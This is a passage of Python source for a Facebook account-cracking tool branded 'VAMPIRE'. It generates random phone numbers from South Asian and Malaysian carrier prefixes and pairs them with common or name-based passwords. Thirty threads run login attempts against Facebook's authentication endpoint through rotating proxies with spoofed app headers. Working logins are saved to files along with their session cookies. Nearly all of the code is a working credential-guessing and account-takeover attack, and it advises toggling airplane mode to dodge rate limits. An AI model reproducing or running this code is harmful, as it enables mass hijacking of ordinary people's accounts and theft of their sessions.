    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n \x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n \x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4\n \x1b[38;5;160m[\033[1;37mE\x1b[38;5;160m]\x1b[38;5;46m METHOD 5\n \x1b[38;5;160m[\033[1;37mF\x1b[38;5;160m]\x1b[38;5;46m METHOD 6");line()
    mtd=input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}")
    clear()
    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f" \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");line()
    __CH__ = input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}")
    if __CH__ in ["A","a","1"]:
        plist.append('first@123')
        plist.append('last@1234')
        plist.append('first@')
        plist.append('last@123')
        plist.append('first@#')
        plist.append('@first@')
        plist.append('last@123')
        plist.append('@1234@')
        plist.append('@12345@')
        plist.append('@123456@')
        plist.append('@1234567@')
        plist.append('@@@@####')
        plist.append('@#@#@#')
        plist.append('bangladesh')
        plist.append('Bangladesh')
        plist.append('@freefire@')
        plist.append('@last@')
    elif __CH__ in ["B","b","2"]:
        clear()
        psl = int(input(f' {red}[{white}●{red}] {green}INPUT PASS LIMITS {red}➠ {green}'));line()
        print(f" {red}[{green}●{red}] {green}EXAMPLE {red}➠ {green} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f' {red}[{green}●{red}] {green}PASSWORD NO-{i+1} {red}➠ {green}'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f' {red}[{green}●{red}]{green} SIM CODE  {red}:{green} {code} {red}➠{green} METHOD {red}: {green}{mtd}')
        print(f' {red}[{green}●{red}]{green} TOTAL UID {red}:{green} %s ' %len(user))
        print(f' {red}[{green}●{red}]{green} TURN {red}[{white}ON{red}/{white}OFF{red}]{green} AIRPLANE MODE EVERY {white}4{green} MIN');line()
        for love in user:
            ids = code + love
            xxc= [love,ids,love[1:],love[2:],ids[5:],ids[4:],ids[3:],ids[2:],ids[1:],ids[0:],ids[:6],ids[:7],ids[:8],ids[:9],ids[:10]]
            tl = len(user)
            psd = xxc
            psd = plist
            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd, tl)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
            elif mtd in ['5','e','05','E']:error.submit(randm4, ids, psd,tl)
            elif mtd in ['6','f','06','F']:error.submit(randm5, ids, psd,tl)
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    print(f' {red}[{green}●{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f' {red}[{green}●{red}]{green} TOTAL OK {red}:{green} %s' % str(len(oks)))
    print(f' {red}[{green}●{red}]{green} TOTAL CP {red}:{red} %s' % str(len(cps)))
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    input(f" {red}[{green}●{red}]{green} PRESS ENTER TO BACK MENU ")
    ___ImRAn___MaIN___MenU___()
#---------INDIA
def ___INDIA___():
    clear()
    print(f' {red}[{green}◆{red}] {green}SIM CODES{red} ➠ {green}+91701 +91902 +91934 +91639');line()
    code = input(f' {red}[{green}◆{red}]{green} Choice    {red}➠ {green}');clear()
    print(f' {red}[{green}◆{red}] {green}EXAMPLE {red}  ➠ {green}10000 20000 30000');line()
    limit = int(input(f' {red}[{green}◆{red}] {green}LIMITS    {red}➠ {green}'));line();clear()
    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n \x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n \x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4\n \x1b[38;5;160m[\033[1;37mE\x1b[38;5;160m]\x1b[38;5;46m METHOD 5\n \x1b[38;5;160m[\033[1;37mF\x1b[38;5;160m]\x1b[38;5;46m METHOD 6");line()
    ___error___=input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}");line();clear()
    print(" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(" \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");line()
    plist = []
    __CH__ = input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}")
    if __CH__ in ["A","a","1"]:       
        plist.append('57273200')
        plist.append('59039200')
        plist.append('07860786')
    elif __CH__ in ["B","b","2"]:
        psl = int(input(f' {red}[{green}●{red}] {green}INPUT PASS LIMITS {red}➠ {green}'));line()
        print(f" {red}[{green}●{red}] {green}EXAMPLE {red}➠{green} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f' {red}[{green}●{red}] {green}PASSWORD NO.{i+1} {red}➠ {green}'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f' {red}[{green}●{red}]{green} SIM CODE  {red}:{green} {code} {red}➠{green} METHOD {red}: {green}{___error___}')
        print(f' {red}[{green}●{red}]{green} TOTAL UID {red}:{green} %s ' %len(user))
        print(f' {red}[{green}●{red}]{green} TURN {red}[{white}ON{red}/{white}OFF{red}]{green} AIRPLANE MODE EVERY {white}4{green} MIN');line()
        for love in user:
            ids = code + love
            xxc= [love,ids,love[1:],love[2:],ids[5:],ids[4:],ids[3:],ids[2:],ids[1:],ids[0:],ids[:6],ids[:7],ids[:8],ids[:9],ids[:10]]
            tl = len(user)
            psd = xxc
            psd = plist
            if ___error___ in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
            elif ___error___ in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif ___error___ in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif ___error___ in ['D','d','04','4']:error.submit(randm3, ids, psd,tl) 
            elif ___error___ in ['5','e','05','E']:error.submit(randm4, ids, psd,tl)
            elif ___error___ in ['6','f','06','F']:error.submit(randm5, ids, psd,tl)
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    print(f' {red}[{green}●{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f' {red}[{green}●{red}]{green} TOTAL OK {red}:{green} %s' % str(len(oks)))
    print(f' {red}[{green}●{red}]{green} TOTAL CP {red}:{green} %s' % str(len(cps)))
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    input(f" {red}[{white}●{red}]{green} PRESS ENTER TO BACK MENU ")
    ___ImRAn___MaIN___MenU___()
#--------MALYASIA
def ___ML___():
    clear()
    print(f' {red}[{green}◆{red}] {green}SIM CODES {red}➠ {green}01125 01128 01137 01161');line()
    code = input(f' {red}[{white}◆{red}]{green} Choice    {red}➠ {green}')
    clear()
    print(f' {red}[{green}◆{red}] {green}EXAMPLE {red}  ➠ {green}10000 20000 30000');line()
    limit = int(input(f' {red}[{green}◆{red}] {green}LIMITS    {red}➠ {green}'));line();clear()
    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n \x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n \x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4\n \x1b[38;5;160m[\033[1;37mE\x1b[38;5;160m]\x1b[38;5;46m METHOD 5\n \x1b[38;5;160m[\033[1;37mF\x1b[38;5;160m]\x1b[38;5;46m METHOD 6");line()
    mtd=input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}");clear()
    plist = []
    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f" \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");line()
    __CH__ = input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append('sabbir')
        plist.append('Bangladesh')
        plist.append('bangladesh')
        plist.append('708090')
        plist.append('saiful')
        plist.append('shakil')
        plist.append('112244')
        plist.append('008899')
        plist.append('jannat')
        plist.append('arafat')
    elif __CH__ in ["B","b","2"]:
        psl = int(input(f' {red}[{green}●{red}] {green}INPUT PASS LIMITS {red}➠ {green}'));line()
        print(f" {red}[{green}●{red}] {green}EXAMPLE {red}➠{green} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f' {red}[{green}●{red}] {green}PASSWORD NO.{i+1} {red}➠ {green}'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f' {red}[{green}●{red}]{green} SIM CODE  {red}:{green} {code} {red}➠{green} METHOD {red}: {green}{mtd}')
        print(f' {red}[{green}●{red}]{green} TOTAL UID {red}:{green} %s ' %len(user))
        print(f' {red}[{green}●{red}]{green} TURN {red}[{white}ON{red}/{white}OFF{red}]{green} AIRPLANE MODE EVERY {white}4{green} MIN');line()
        for love in user:
            ids = code + love
            xxc= [love,ids,love[1:],love[2:],ids[5:],ids[4:],ids[3:],ids[2:],ids[1:],ids[0:],ids[:6],ids[:7],ids[:8],ids[:9],ids[:10]]
            tl = len(user)
            psd = xxc
            psd = plist
            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
            elif mtd in ['5','e','05','E']:error.submit(randm4, ids, psd,tl)
            elif mtd in ['6','f','06','F']:error.submit(randm5, ids, psd,tl)
    print('')
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    print(f' {red}[{green}●{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f' {red}[{green}●{red}]{green} TOTAL OK {red}:{green} %s' % str(len(oks)))
    print(f' {red}[{green}●{red}]{green} TOTAL CP {red}:{green} %s' % str(len(cps)))
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    input(f" {red}[{green}●{red}]{green} PRESS ENTER TO BACK MENU ")
    ___ImRAn___MaIN___MenU___()
#---------PAKISTHAN
def ___PK___():
    clear()
    print(f' {red}[{green}◆{red}] {green}SIM CODES {red}➠ {green}0315 0345 0333');line()
    code = input(f' {red}[{green}◆{red}]{green} Choice    {red}➠ {green}');clear()
    print(f' {red}[{green}◆{red}] {green}EXAMPLE {red}  ➠ {green}10000 20000 30000');line()
    limit = int(input(f' {red}[{green}◆{red}] {green}LIMITS    {red}➠ {green}'));line()
    plist = []
    clear()
    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n \x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n \x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4\n \x1b[38;5;160m[\033[1;37mE\x1b[38;5;160m]\x1b[38;5;46m METHOD 5\n \x1b[38;5;160m[\033[1;37mF\x1b[38;5;160m]\x1b[38;5;46m METHOD 6");line()
    mtd=input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE \033[1;37m➠ {green}");clear()
    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f" \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");line()
    __CH__ = input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append('khan123')
        plist.append('khan786')
        plist.append('khankhan')
        plist.append('khan khan')
        plist.append('khan1234')
        plist.append('khan12345')
        plist.append('102030')
        plist.append('203040')
    elif __CH__ in ["B","b","2"]:
        clear()
        psl = int(input(f' {red}[{green}●{red}] {green}INPUT PASS LIMITS {red}➠ {green}'));line()
        print(f" {red}[{green}●{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f' {red}[{green}●{red}] {green}PASSWORD NO.{i+1} {red}➠ {green}'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f' {red}[{green}●{red}]{green} SIM CODE  {red}:{green} {code} {red}➠{green} METHOD {red}: {green}{mtd}')
        print(f' {red}[{green}●{red}]{green} TOTAL UID {red}:{green} %s ' %len(user))
        print(f' {red}[{green}●{red}]{green} TURN {red}[{white}ON{red}/{white}OFF{red}]{green} AIRPLANE MODE EVERY {white}4{green} MIN');line()
        for love in user:
            ids = code + love
            xxc= [love,ids,love[1:],love[2:],ids[5:],ids[4:],ids[3:],ids[2:],ids[1:],ids[0:],ids[:6],ids[:7],ids[:8],ids[:9],ids[:10]]
            tl = len(user)
            psd = xxc
            psd = plist
            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
            elif mtd in ['5','e','05','E']:error.submit(randm4, ids, psd,tl)
            elif mtd in ['6','f','06','F']:error.submit(randm5, ids, psd,tl)
    print('')
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    print(f' {red}[{green}●{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f' {red}[{green}●{red}]{green} TOTAL OK {red}:{green} %s' % str(len(oks)))
    print(f' {red}[{green}●{red}]{green} TOTAL CP {red}:{green} %s' % str(len(cps)))
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    input(f" {red}[{green}●{red}]{green} PRESS ENTER TO BACK MENU ")
    ___ImRAn___MaIN___MenU___()
#---------NEPAL
def ___NP___():
    clear()
    print(f' {red}[{green}◆{red}] {green}SIM CODES {red}➠ {green}+977 ETC ');line()
    code = input(f' {red}[{green}◆{red}]{green} Choice    {red}➠ \x1b[38;5;208m')
    clear()
    print(f' {red}[{green}◆{red}] {green}EXAMPLE {red}  ➠ {green}10000 20000 30000{red}]');line()
    limit = int(input(f' {red}[{green}◆{red}] {green}LIMITS    {red}➠ {green}'))
    line()
    plist = []
    clear()
    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n \x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n \x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4\n \x1b[38;5;160m[\033[1;37mE\x1b[38;5;160m]\x1b[38;5;46m METHOD 5\n \x1b[38;5;160m[\033[1;37mF\x1b[38;5;160m]\x1b[38;5;46m METHOD 6");line()
    mtd=input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}")
    clear()
    print(f" \x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f" \x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD {red}(BEST)");line()
    __CH__ = input(f" \x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOICE {red}➠ {green}")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append("nepal12")
        plist.append("nepal123")
        plist.append("nepal1234")
        plist.append("nepal12345")
        plist.append("maya123")
        plist.append("kathmandu")
        plist.append("pokhara")
        plist.append("tamang")
        plist.append("maya1234")
        plist.append("tamang12345")
        plist.append("tamang123")
        plist.append("nepal@123")
        plist.append("kathmandu123")
    elif __CH__ in ["B","b","2"]:
        clear()
        psl = int(input(f' {red}[{green}●{red}] {green}INPUT PASS LIMITS {red}➠ {green}'));line()
        print(f" {red}[{white}●{red}] {green}EXAMPLE {red}➠{green} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f' {red}[{green}●{red}] {green}PASSWORD NO.{i+1} {red}➠ {green}'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f' {red}[{white}●{red}]{green} SIM CODE  {red}:{green} {code} {red}➠{green} METHOD {red}: {green}{mtd}')
        print(f' {red}[{white}●{red}]{green} TOTAL UID {red}:{green} %s ' %len(user))
        print(f' {red}[{white}●{red}]{green} TURN {red}[{white}ON{red}/{white}OFF{red}]{green} AIRPLANE MODE EVERY {white}4{green} MIN');line()
        for love in user:
            ids = code + love
            xxc= [love,ids,love[1:],love[2:],ids[5:],ids[4:],ids[3:],ids[2:],ids[1:],ids[0:],ids[:6],ids[:7],ids[:8],ids[:9],ids[:10]]
            tl = len(user)
            psd = xxc
            psd = plist
            if mtd in ['A','a','01','1']:error.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:error.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:error.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:error.submit(randm3, ids, psd,tl)
            elif mtd in ['5','e','05','E']:error.submit(randm4, ids, psd,tl)
            elif mtd in ['6','f','06','F']:error.submit(randm5, ids, psd,tl)
    print('')
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    print(f' {red}[{green}●{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f' {red}[{green}●{red}]{green} TOTAL OK {red}:{green} %s' % str(len(oks)))
    print(f' {red}[{green}●{red}]{green} TOTAL CP {red}:{green} %s' % str(len(cps)))
    print(f'\r{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    input(f" {red}[{white}●{red}]{green} PRESS ENTER TO BACK MENU ")
    ___ImRAn___MaIN___MenU___()
#---------FILE MENU
def ___ImRAn___FiLE___MenU___():
    global methods
    clear()
    print(f' {red}[{white}●{red}] {green}EXAMPLE »» {red}[{green}sdcard/filename.txt{red}]');line()
    dfile = input(f' {red}[{white}●{red}] {green}INPUT YOUR FILE {red}➠ {green}');line();clear()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f' {red}[{white}×{red}] FILE NOT FOUND...');time.sleep(1);___ImRAn___FiLE___MenU___()
    dplist = []
    try:
        pass_lmit = int(input(f' {red}[{white}●{red}] {green}INPUT PASS LIMITS {red}➠ {green}'));line()
    except:
        pass_lmit = 3
    print(f' {red}[{white}●{red}] {green}EXAMPLE {red}[{green}firstlast first123 ETC{red}]')
    line()
    for i in range(pass_lmit):        
        dplist.append(input(f' {red}[{white}●{red}] {green}PASSWORD NO.{i+1} {red}➠ {green}'));line()
    __METHOD__ = input(f" {red}[{white}1{red}]{green} METHOD M1 \n {red}[{white}2{red}] {green}METHOD M2 \n {red}[{white}3{red}] {green}METHOD M3 \n {red}[{white}4{red}] {green}METHOD M4 \n {red}[{white}5{red}] {green}METHOD M5 \n {red}[{white}6{red}] {green}METHOD M6{white}\n{red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}\n {red}[{white}◆{red}] {green}CHOICE {white}➠ {green}");clear()
    with ThreadPoolExecutor(max_workers=30) as error:
        clear()
        print(f' {red}[{white}●{red}] {green}TOTAL IDS {red}[»{green}{len(dx)}{red}«] {green}METHOD {red}[»{green}{__METHOD__}{red}«]')
        print(f' {red}[{white}●{red}] {green}TURN {red}[{green}On/Off{red}]{green} ✈ MODE EVERY 4 MIN')
        line()
        for user in dx:
            ids,names = user.split('|')
            tl = len(dx)
            passlist = dplist
            if __METHOD__ in ["A","a","1","01"]:
                error.submit(__MTDONEE__,ids,names,passlist,tl)
            elif __METHOD__ in ["B","b","2","02"]:
                error.submit(__MTDTWOO__,ids,names,passlist,tl)
            elif __METHOD__ in ["C","c","3","03"]:
                error.submit(__MTDTHREE__,ids,names,passlist,tl)
            elif __METHOD__ in ["D","d","4","04"]:
                error.submit(__MTDFOUR__,ids,names,passlist,tl)
            elif __METHOD__ in ["E","e","5","05"]:
                error.submit(__MTDFIVE__,ids,names,passlist,tl)
            elif __METHOD__ in ["F","f","6","06"]:
                error.submit(__MTDONE6__ ,ids,names,passlist,tl)
            else:
                error.submit(__MTDONEE__,ids,names,passlist,tl)
    print('')
    print(f'\r {red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    print(f' {red}[{white}●{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f' {red}[{white}●{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f' {red}[{white}●{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r {red}◆{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{red}◆{white}')
    input(f" {red}[{white}●{red}]{green} PRESS ENTER TO BACK MENU ")
    ___ImRAn___MaIN___MenU___()
#---------FILE M1
try:
    def __MTDONEE__(sid, name, psw,tl):
        try:
            global oks,cps,loop,xvx
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                prox=random.choice(xvx)
                bro={"http":"socks4://"+prox}
                head = {'User-Agent': f'{F1}','Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':sid,'password':ps,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,proxies=bro).text
                q = json.loads(po)
                if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M1.txt','a').write(sid+'|'+ps+'\n')
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     oks.append(sid)
                     break
                elif 'www.facebook.com' in q:
                     print(f"\r\r {green}[{red}VAMPIRE-CP{green}]{green} {sid} {red}| {green}{ps} ")
                     open('/sdcard/VAMPIRE/VAMPIRE-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:continue
            loop+=1
        except Exception as e:time.sleep(30)
#---------FILE M2
    def __MTDTWOO__(sid, name, psw,tl):
        try:
            global oks,cps,loop,xvx
            abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f"\r {red}[{abir}VAMPIRE{red}]-{red}[{cyan}{loop}{red}]-{red}[{green}OK{white}-{green}{len(oks)}{red}]-{red}[{green}{'{:.1%}'.format(loop/int(tl))}{red}]"),
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                prox=random.choice(xvx)
                bro={"http":"socks4://"+prox}
                head = {'User-Agent': f'{F2}','Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
                data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':sid,'password':ps,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head,proxies=bro).text
                q = json.loads(po)
                if 'session_key' in q:
                     cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                     print(f"\r\r {red}[{green}VAMPIRE-OK{red}] {green}{sid} {red}| {green}{ps} ")
